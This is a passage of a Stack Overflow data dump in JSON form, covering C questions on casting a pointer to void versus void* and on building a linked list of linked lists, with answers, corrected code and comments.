effect on <code>p</code> itself? :)"}, {"owner": {"reputation": 1439, "user_id": 5196093, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ovj7.png?s=128&g=1", "display_name": "Ray", "link": "https://stackoverflow.com/users/5196093/ray"}, "edited": false, "score": 0, "creation_date": 1444860955, "post_id": 33128064, "comment_id": 54084601, "body": "To elaborate, the supression of that sort of warning is largely what casts to void are for.  In this specific example, the statement is indistinguishable from the empty expression, but in other cases there may be side-effects.  Casting to void is a way to inform the compiler that while you may care about the side-effects, you don&#39;t care about the expession&#39;s value.  e.g. printf(&quot;Foo\\n&quot;) evaluates to 4 (the number of characters printed) if it is successful, or a negative value otherwise. (void)printf(&quot;Foo\\n&quot;) just prints Foo\\n as best it can and doesn&#39;t evaluate to anything."}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 12, "last_activity_date": 1444833980, "last_edit_date": 1444833980, "creation_date": 1444832783, "answer_id": 33128064, "question_id": 33127990, "link": "https://stackoverflow.com/questions/33127990/casting-pointer-to-void/33128064#33128064", "title": "Casting pointer to void", "body": "<p>Yes, obviously.</p>\n\n<pre><code> (void)p;\n</code></pre>\n\n<p>means the object is getting casted to <code>void</code> type, (which is not a complete type) and that being the complete expression, the result of the expression should not be used, hence compiler does not check for it's usage.</p>\n\n<p>Quoting <code>C11</code> standard, chapter 6.3.2.2, <code>void</code></p>\n\n<blockquote>\n  <p>The (nonexistent) value of a <code>void</code> expression (an expression that has type void) shall not\n  be used in any way,[......] If an expression of any other type is evaluated as a <code>void</code>\n  expression, its value or designator is discarded.</p>\n</blockquote>\n\n<p>So, no warning or error is generated.</p>\n\n<p>OTOH, </p>\n\n<pre><code>(void *)p;\n</code></pre>\n\n<p>means the object is a pointer to <code>void</code> type, which is a complete type and should be used in your program. In that case, the non-usage of the object out of the expression is rightly reported by the compiler.</p>\n"}, {"comments": [{"owner": {"reputation": 23009, "user_id": 3613500, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/lIfov.png?s=128&g=1", "display_name": "David Haim", "link": "https://stackoverflow.com/users/3613500/david-haim"}, "edited": false, "score": 0, "creation_date": 1444834029, "post_id": 33128083, "comment_id": 54069097, "body": "can you give some real-world-use of this feature?"}, {"owner": {"reputation": 77578, "user_id": 32914, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/50facfccdffe2e9cabaa589205959d30?s=128&d=identicon&r=PG", "display_name": "Mason Wheeler", "link": "https://stackoverflow.com/users/32914/mason-wheeler"}, "reply_to_user": {"reputation": 23009, "user_id": 3613500, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/lIfov.png?s=128&g=1", "display_name": "David Haim", "link": "https://stackoverflow.com/users/3613500/david-haim"}, "edited": false, "score": 1, "creation_date": 1444834953, "post_id": 33128083, "comment_id": 54069753, "body": "@DavidHaim: I&#39;ve seen it in cases where certain local variables are only used inside an <code>IFDEF</code>, to make it so that it doesn&#39;t raise warnings when compiled with settings that take the <code>ELSE</code> branch."}, {"owner": {"reputation": 23009, "user_id": 3613500, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/lIfov.png?s=128&g=1", "display_name": "David Haim", "link": "https://stackoverflow.com/users/3613500/david-haim"}, "edited": false, "score": 0, "creation_date": 1444835845, "post_id": 33128083, "comment_id": 54070362, "body": "lol, so declare the local variable inside the ELSE branch if it&#39;s the only place that touches it. or I guess it&#39;s commping from a period where you ahd to declare all the variables together at the start of the scope.."}, {"owner": {"reputation": 11533, "user_id": 1366431, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/YBopF.png?s=128&g=1", "display_name": "Leushenko", "link": "https://stackoverflow.com/users/1366431/leushenko"}, "edited": false, "score": 0, "creation_date": 1444836865, "post_id": 33128083, "comment_id": 54071071, "body": "&quot;It&#39;s effectively the same as an empty statement&quot; -&gt; pretty much any expression in C can have side effects. This answer currently implies that a compiler might reduce <code>(void)sideEffectingFunction(a = b, c++);</code> down to <code>;</code>, which is obviously not the case."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 11533, "user_id": 1366431, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/YBopF.png?s=128&g=1", "display_name": "Leushenko", "link": "https://stackoverflow.com/users/1366431/leushenko"}, "edited": false, "score": 0, "creation_date": 1444839163, "post_id": 33128083, "comment_id": 54072638, "body": "@Leushenko Of course it&#39;s not the <i>general</i> case, but for <i>this</i> case it&#39;s basically equivalent."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 23009, "user_id": 3613500, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/lIfov.png?s=128&g=1", "display_name": "David Haim", "link": "https://stackoverflow.com/users/3613500/david-haim"}, "edited": false, "score": 2, "creation_date": 1444839219, "post_id": 33128083, "comment_id": 54072672, "body": "@DavidHaim Casting a variable to <code>void</code> is a way to silence potential compiler warnings about unused function arguments."}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "reply_to_user": {"reputation": 23009, "user_id": 3613500, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/lIfov.png?s=128&g=1", "display_name": "David Haim", "link": "https://stackoverflow.com/users/3613500/david-haim"}, "edited": false, "score": 0, "creation_date": 1445004301, "post_id": 33128083, "comment_id": 54152351, "body": "@DavidHaim \u2191 That can be seen as an example <a href=\"http://stackoverflow.com/a/28382691/3049655\">here</a>"}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 14, "last_activity_date": 1444832834, "creation_date": 1444832834, "answer_id": 33128083, "question_id": 33127990, "link": "https://stackoverflow.com/questions/33127990/casting-pointer-to-void/33128083#33128083", "title": "Casting pointer to void", "body": "<p>When you do</p>\n\n<pre><code>(void) p;\n</code></pre>\n\n<p>You tell the compiler to simply disregard the result of the expression <code>p</code>. It's effectively the same as an empty statement:</p>\n\n<pre><code>;\n</code></pre>\n\n<hr>\n\n<p>When you do</p>\n\n<pre><code>(void *) p;\n</code></pre>\n\n<p>You tell the compiler to treat the variable <code>p</code> as a generic pointer, and that's the full expression for the statement, an expression which doesn't really do anything and you get the error message.</p>\n"}], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2784, "favorite_count": 0, "accepted_answer_id": 33128064, "answer_count": 2, "score": 12, "last_activity_date": 1444833980, "creation_date": 1444832623, "last_edit_date": 1495542767, "question_id": 33127990, "link": "https://stackoverflow.com/questions/33127990/casting-pointer-to-void", "title": "Casting pointer to void", "body": "<p>Is there any difference in below two castings ?</p>\n\n<pre><code>int a=10;\nint *p=&amp;a;\n\n(void)p;          //does not give any warning or error \n</code></pre>\n\n<p>or  </p>\n\n<pre><code>(void *)p;        //error: statement with no effect [-Werror=unused-value]\n</code></pre>\n\n<p>when complied with <code>gcc -Wall -Werror --std=c99 -pedantic</code> </p>\n\n<p><a href=\"https://stackoverflow.com/questions/33127075/traverse-pointer-from-last-node-to-first/33127236?noredirect=1#comment54067159_33127236\">Just saw that in this answer.</a>  (clearly I misunderstood something )</p>\n"}, {"tags": ["c", "linked-list"], "comments": [{"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1444833167, "post_id": 33127814, "comment_id": 54068414, "body": "You need to actually assign  <code>last_pers-&gt;next = temp_pers</code> in <code>add</code> (where <code>last_pers</code> needs to point to the last person in the list)."}, {"owner": {"reputation": 1880, "user_id": 4281182, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/teZv4.png?s=128&g=1", "display_name": "Sel&#231;uk Cihan", "link": "https://stackoverflow.com/users/4281182/sel%c3%a7uk-cihan"}, "edited": false, "score": 0, "creation_date": 1444833683, "post_id": 33127814, "comment_id": 54068843, "body": "One correction is, right before the inner while loop, you need to update temp_info to the correct inner linked list&#39;s head, like: temp_info = temp_pers-&gt;info_head; You shouldn&#39;t need a global head_info, assuming the inner lists are independent lists, not connected to each other."}, {"owner": {"reputation": 1478, "user_id": 4608207, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/bc633cfa2c8954cf90dfdf55a9ecd1d8?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4608207/john"}, "reply_to_user": {"reputation": 1880, "user_id": 4281182, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/teZv4.png?s=128&g=1", "display_name": "Sel&#231;uk Cihan", "link": "https://stackoverflow.com/users/4281182/sel%c3%a7uk-cihan"}, "edited": false, "score": 0, "creation_date": 1444833882, "post_id": 33127814, "comment_id": 54068991, "body": "Oh ok yeah that makes sense @Sel&#231;ukCihan, I&#39;ll make that fix."}, {"owner": {"reputation": 1478, "user_id": 4608207, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/bc633cfa2c8954cf90dfdf55a9ecd1d8?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4608207/john"}, "reply_to_user": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1444833965, "post_id": 33127814, "comment_id": 54069049, "body": "@KlasLindb&#228;ck isn&#39;t that what I&#39;m doing by traversing through the list?"}, {"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1444835248, "post_id": 33127814, "comment_id": 54069955, "body": "After traversing the list, <code>temp_person</code> points to NULL. Assigning <code>temp_person</code> after that  does not change the <code>next</code> pointer of the last item in the list."}, {"owner": {"reputation": 10050, "user_id": 3512538, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/6Om7A.png?s=128&g=1", "display_name": "CIsForCookies", "link": "https://stackoverflow.com/users/3512538/cisforcookies"}, "edited": false, "score": 0, "creation_date": 1444845977, "post_id": 33127814, "comment_id": 54076558, "body": "@Shane, there is no need for casting in malloc, when writing in C: <a href=\"http://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\" title=\"do i cast the result of malloc\">stackoverflow.com/questions/605845/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1444833537, "post_id": 33128265, "comment_id": 54068734, "body": "Your fix doesn&#39;t work. <code>head_pers</code> always points to the first item, so your fix limits the list to 2 items. He needs to find the last item (the one where <code>-&gt;next == NULL</code>) and set its <code>next</code> pointer to the new person."}, {"owner": {"reputation": 10050, "user_id": 3512538, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/6Om7A.png?s=128&g=1", "display_name": "CIsForCookies", "link": "https://stackoverflow.com/users/3512538/cisforcookies"}, "reply_to_user": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 1, "creation_date": 1444840210, "post_id": 33128265, "comment_id": 54073261, "body": "@KlasLindb&#228;ck You are right. That will only fix the second element. I will add the generic fix. thx for pointing that"}], "tags": [], "owner": {"reputation": 10050, "user_id": 3512538, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/6Om7A.png?s=128&g=1", "display_name": "CIsForCookies", "link": "https://stackoverflow.com/users/3512538/cisforcookies"}, "is_accepted": false, "score": 1, "last_activity_date": 1444840320, "last_edit_date": 1444840320, "creation_date": 1444833229, "answer_id": 33128265, "question_id": 33127814, "link": "https://stackoverflow.com/questions/33127814/linkedlist-of-linkedlists-c/33128265#33128265", "title": "LinkedList of LinkedLists C", "body": "<p>As you can see, your code prints out the first node and sub-node: <code>(\"Joe\", \"the King\", \"had a child.\", 4)</code> and that means your insertion is working, at least at start. After this line it terminates, meaning <code>temp_pers = temp_pers-&gt;next == NULL;</code></p>\n\n<p>Now, let's look at your second insertion:</p>\n\n<pre><code>else{\ntemp_pers = head_pers;\ntemp_info = head_info;\nwhile(temp_pers != NULL){ //iterate through list of people\n    if(strcmp(temp_pers-&gt;name, name) == 0){ //adding a duplicate\n        while(temp_info != NULL){ //iterate through that persons info list\n            temp_info = temp_info-&gt;next;\n        } //reached the end of the list\n        temp_info = new_info;\n        temp_pers-&gt;count = temp_pers-&gt;count + 1;\n        temp_pers-&gt;next = NULL;\n    }\n    temp_pers = temp_pers-&gt;next;\n}\n//reached end of persons list with no find\n//add new person to the end of the list\ntemp_pers = new_person;\ntemp_pers-&gt;count = temp_pers-&gt;count + 1;\ntemp_pers-&gt;next = NULL;\n}\n</code></pre>\n\n<p>You created a <code>temp_pers</code> and assigned it something but after the scope ends, this node isn't connected to your <code>head_pers</code>. So, each time you construct a new struct and assign it to <code>temp_pers</code> you are not entering it to the main linked list (<strong>a.k.a</strong> <code>head_pers</code>), so each time you check the condition inside your loop (this one: <code>while(temp_pers != NULL)</code>) you check the last node you created, and since it isn't linked to something, it gives you NULL on the next node.</p>\n\n<p>How to fix: <code>head_pers-&gt;next = temp_pers;</code> in the else section. Now, this will make sure the 2nd node is connected to the 1st. From now on, each node you create should be connected the the end of the list. You can do that by saving the last node (O(1) time), or by iterating through the list on each add (O(n) time)</p>\n"}, {"comments": [{"owner": {"reputation": 1478, "user_id": 4608207, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/bc633cfa2c8954cf90dfdf55a9ecd1d8?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4608207/john"}, "edited": false, "score": 0, "creation_date": 1444838092, "post_id": 33128923, "comment_id": 54071918, "body": "I changed it to struct Person *las_pers; and now it works a little bit... it now prints out &#39;Joe, the King 2 4\thad a child. Joe, the King 12 Sue, the Queen 7&#39;"}, {"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "reply_to_user": {"reputation": 1478, "user_id": 4608207, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/bc633cfa2c8954cf90dfdf55a9ecd1d8?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4608207/john"}, "edited": false, "score": 0, "creation_date": 1444890770, "post_id": 33128923, "comment_id": 54093163, "body": "Thanks, that was a typo on my part."}], "tags": [], "owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "is_accepted": false, "score": 1, "last_activity_date": 1444890671, "last_edit_date": 1444890671, "creation_date": 1444834962, "answer_id": 33128923, "question_id": 33127814, "link": "https://stackoverflow.com/questions/33127814/linkedlist-of-linkedlists-c/33128923#33128923", "title": "LinkedList of LinkedLists C", "body": "<p>In <code>add</code>, after the loop, <code>temp_pers</code> points to <code>NULL</code>. You need to keep a pointer to the last person in the list:</p>\n\n<pre><code>struct Person *last_pers;\n</code></pre>\n\n<p>last_pers = temp_pers;</p>\n\n<pre><code>while(temp_pers != NULL){ //iterate through list of people\n    if(strcmp(temp_pers-&gt;name, name) == 0){ //adding a duplicate\n        while(temp_info != NULL){ //iterate through that persons info list\n            temp_info = temp_info-&gt;next;\n        } //reached the end of the list\n        temp_info = new_info;\n        temp_pers-&gt;count = temp_pers-&gt;count + 1;\n        temp_pers-&gt;next = NULL;\n    }\n    last_pers = temp_pers;\n    temp_pers = temp_pers-&gt;next;\n}\n//reached end of persons list with no find\n//add new person to the end of the list\nlast_pers-&gt;next = new_person;  \nnew_person-&gt;count = 1;\nnew_person-&gt;next = NULL;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1478, "user_id": 4608207, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/bc633cfa2c8954cf90dfdf55a9ecd1d8?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4608207/john"}, "edited": false, "score": 0, "creation_date": 1444844096, "post_id": 33131924, "comment_id": 54075449, "body": "Thank you! That makes a lot more sense that everything else should be local! and your right, breaking everything up into more methods makes it easier to read and understand. Your code helped a lot thanks"}], "tags": [], "owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "is_accepted": true, "score": 2, "last_activity_date": 1444843825, "creation_date": 1444843825, "answer_id": 33131924, "question_id": 33127814, "link": "https://stackoverflow.com/questions/33127814/linkedlist-of-linkedlists-c/33131924#33131924", "title": "LinkedList of LinkedLists C", "body": "<p>All your global variables except the <code>pers_head</code> should be locals. There is only one head, namely the head of the person list. All other information is contained within this list: Other persons vie the <code>next</code> pointers; information via the person's <code>info</code>. Most importantly, there is no global info head; the info head belongs to each person.</p>\n\n<p>When you print your list of persons and events, you should do so with two loops:</p>\n\n<pre><code>void printAll()\n{\n    struct Person *pers = head;\n\n    while (pers) {\n        printf(\"%s, %s [%d]\\n\",\n            pers-&gt;name, pers-&gt;desc, pers-&gt;count);\n\n        struct Information *info = pers-&gt;info;\n\n        while (info) {\n            printf(\"    %d: %s\\n\", info-&gt;chapter, info-&gt;text);\n            info = info-&gt;next;\n        }\n\n        pers = pers-&gt;next;\n    }\n}\n</code></pre>\n\n<p>Note how <code>pers</code> and <code>info</code> are local variables, not global. They are used and have a meaining only in the scope where they are defined. That's good: It is easy to see that <code>pers</code> just iterates over all persons, nothing else.</p>\n\n<p>When you add a person, you create a new person node right away. But you might not need a new node if the person is already in the list. Create the node only if you really need it.</p>\n\n<p>Your <code>add</code> function does too much stuff: It allocates and populates the nodes and infos and it organises the lists. If you write separate functions to create nodes and to insert an info to a person, the core list code will look cleaner.</p>\n\n<p>A possible implementation (with slightly changed, or rather shortzened, variable names) could be:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nstruct Person{\n    char *name;\n    char *desc;\n    int count;\n    struct Person *next;\n    struct Information *info;\n};\nstruct Information{\n    char *text;\n    int chapter;\n    struct Information *next;\n};\n\nstruct Person *head;\n\nstruct Information *info_new(char *text, int chapter)\n{\n    struct Information *info = malloc(sizeof(*info));\n\n    info-&gt;text = text;\n    info-&gt;chapter = chapter;\n    info-&gt;next = NULL;\n\n    return info;\n}\n\nstruct Person *pers_new(char *name, char *desc)\n{\n    struct Person *pers = malloc(sizeof(*pers));\n\n    pers-&gt;name = name;\n    pers-&gt;desc = desc;\n    pers-&gt;next = NULL;\n    pers-&gt;info = NULL;\n    pers-&gt;count = 0;\n\n    return pers;\n}\n\nvoid pers_add_info(struct Person *pers, struct Information *info)\n{\n    if (pers-&gt;info == NULL) {\n        pers-&gt;info = info;\n    } else {\n        struct Information *j = pers-&gt;info;\n\n        while (j-&gt;next) j = j-&gt;next;\n        j-&gt;next = info;\n    }\n\n    info-&gt;next = NULL;\n    pers-&gt;count++;\n}\n\nvoid add(char *name, char *desc, char *infotext, int chapter)\n{\n    struct Information *info = info_new(infotext, chapter);\n    struct Person *pers = head;\n    struct Person *prev = NULL;\n\n    while (pers) {\n        if (strcmp(pers-&gt;name, name) == 0\n         &amp;&amp; strcmp(pers-&gt;desc, desc) == 0) {\n            pers_add_info(pers, info);\n            return;\n        }\n        prev = pers;\n        pers = pers-&gt;next;\n    }\n\n    pers = pers_new(name, desc);\n    pers_add_info(pers, info);\n\n    if (prev) {\n        prev-&gt;next = pers;\n    } else {\n        head = pers;\n    }\n}\n\nvoid printAll()\n{\n    struct Person *pers = head;\n\n    while (pers) {\n        printf(\"%s, %s [%d]\\n\",\n            pers-&gt;name, pers-&gt;desc, pers-&gt;count);\n\n        struct Information *info = pers-&gt;info;\n\n        while (info) {\n            printf(\"    %d: %s\\n\", info-&gt;chapter, info-&gt;text);\n            info = info-&gt;next;\n        }\n\n        pers = pers-&gt;next;\n    }\n}\n\nint main()\n{\n    add(\"Joe\", \"the king\", \"had a child\", 4);\n    add(\"Sue\", \"the queen\", \"gave birth to a child\", 4);\n    add(\"Ben\", \"the prince\", \"is born\", 4);\n    add(\"Joe\", \"the king\", \"started a war\", 7);\n    add(\"Joe\", \"the king\", \"returns home victorious\", 8);\n    add(\"Ben\", \"the prince\", \"is squire to Lord Sam\", 8);\n    add(\"Sam\", \"High Lord\", \"takes Sam as apprentice\", 8);\n    add(\"Ben\", \"the prince\", \"goes on a quest\", 9);\n    add(\"Sue\", \"the queen\", \"poisoned Joe\", 10);\n    add(\"Ben\", \"the prince\", \"takes revenge\", 10);\n    add(\"Sam\", \"High Lord\", \"goes on a crusade\", 11);\n    add(\"Sue\", \"the queen\", \"repents\", 14);\n    add(\"Sue\", \"the hermit\", \"dies of old age and lonely\", 14);\n\n    printAll();\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 1478, "user_id": 4608207, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/bc633cfa2c8954cf90dfdf55a9ecd1d8?s=128&d=identicon&r=PG&f=1", "display_name": "John", "link": "https://stackoverflow.com/users/4608207/john"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 390, "favorite_count": 0, "accepted_answer_id": 33131924, "answer_count": 3, "score": 2, "last_activity_date": 1444890671, "creation_date": 1444832179, "last_edit_date": 1444840489, "question_id": 33127814, "link": "https://stackoverflow.com/questions/33127814/linkedlist-of-linkedlists-c", "title": "LinkedList of LinkedLists C", "body": "<p>Im trying to create a LinkedList that will be populated with LinkedLists. The main LinkedList will hold a characters name and description, as well as how many nodes are held in its inner LinkedList. The inner LinkedList will hold the chapter number they appear in and a brief description for that chapter.\nSo for instance, character Joe(name) is a King(descriptor) and appears in chapters 4 7 and 10. So he would have 3 inner nodes with a description of what he did in those chapters.\nI don't think Im adding to the lists right though, because when I call to iterate through the lists and print everything, I only get the first person I added.</p>\n\n<p>The two structs I made.  </p>\n\n<pre><code>struct Person{\n    char * name;\n    char * descriptor;\n    int count;\n    struct Person * next;\n    struct Information * info_head;\n};\nstruct Information{\n    char * text;\n    int chapter;\n    struct Information * next;\n};\n</code></pre>\n\n<p>Creating pointers.</p>\n\n<pre><code>struct Person * new_person, *temp_pers, *head_pers;\nstruct Information * new_info, *temp_info, *head_info;\n</code></pre>\n\n<p>function used for adding new characters.</p>\n\n<pre><code>void add(char * name, char * descriptor, char * info, int chapter){\nnew_person = (struct Person *)malloc(sizeof(struct Person));\nnew_info = (struct Information *)malloc(sizeof(struct Information));\n\nnew_info-&gt;chapter = chapter;\nnew_info-&gt;text = info;\nnew_person-&gt;name = name;\nnew_person-&gt;descriptor = descriptor;\n\nif(head_pers == NULL){  //List is empty\n    head_pers = new_person; //add new person\n    new_person-&gt;info_head = new_info;//link to information\n    head_pers-&gt;next = NULL;\n    head_info = new_info; //name that information start of information list\n    head_pers-&gt;count = 1;\n    head_info-&gt;next = NULL;\n}\nelse{\n    temp_pers = head_pers;\n    temp_info = head_info;\n    while(temp_pers != NULL){ //iterate through list of people\n        if(strcmp(temp_pers-&gt;name, name) == 0){ //adding a duplicate\n            while(temp_info != NULL){ //iterate through that persons info list\n                temp_info = temp_info-&gt;next;\n            } //reached the end of the list\n            temp_info = new_info;\n            temp_pers-&gt;count = temp_pers-&gt;count + 1;\n            temp_pers-&gt;next = NULL;\n        }\n        temp_pers = temp_pers-&gt;next;\n    }\n    //reached end of persons list with no find\n    //add new person to the end of the list\n    temp_pers = new_person;\n    temp_pers-&gt;count = temp_pers-&gt;count + 1;\n    temp_pers-&gt;next = NULL;\n}\n</code></pre>\n\n<p>}</p>\n\n<p>My printing method for testing</p>\n\n<pre><code>void printAll(){\n    temp_pers = head_pers;\n    temp_info = head_info;\n    while(temp_pers != NULL){\n        printf(\"%s, %s %d\\n\", temp_pers-&gt;name, temp_pers-&gt;descriptor, temp_pers-&gt;count);\n        while(temp_info != NULL){\n            printf(\"%d\\t%s\", temp_info-&gt;chapter, temp_info-&gt;text);\n            temp_info = temp_info-&gt;next;\n        }\n        temp_pers = temp_pers-&gt;next;\n    }\n}\n</code></pre>\n\n<p>Main method</p>\n\n<pre><code>int main(){\n    add(\"Joe\", \"the King\", \"had a child.\", 4);\n    add(\"Joe\", \"the King\", \"started a war\", 7);\n    add(\"Sue\", \"the Queen\", \"poisoned Joe\", 10);\n\n    printAll();\n\n    return 0;\n}\n</code></pre>\n\n<p>Dealing with a LinkedList of LinkedLists is confusing me and maybe I'm just missing something really small, or maybe something really big, but any help would be great. \nAlmost forgot, the code does compile and outputs this... </p>\n\n<pre><code>    Joe, the King 2\n4   had a child.\n</code></pre>\n\n<p>Because its printing out the count for Joe as 2, I think it's working some what.</p>\n"}, {"tags": ["c", "scanf"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444831846, "post_id": 33127384, "comment_id": 54067421, "body": "fgets() only returns NULL on EOF (or error), so staying in the loop will not be usefull. (BTW adding a space to the <code>&quot; %d&quot;</code> format string could possibly help)"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 2, "creation_date": 1444832145, "post_id": 33127384, "comment_id": 54067635, "body": "@wildplasser: sscanf automatically skips whitespace before %d. How does adding a space to the format change anything?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1444832305, "post_id": 33127384, "comment_id": 54067761, "body": "Note that the poor user faced with this code gets told &quot;you did it wrong&quot; but gets no hint about what is right.  You should help them: <code>printf(&quot;Invalid input (range %d..%d).  Try again: &quot;, low, high);</code> would at least let them know what&#39;s expected."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1444832481, "post_id": 33127384, "comment_id": 54067887, "body": "@rici: I stand corrected. The other point (fgets() returning 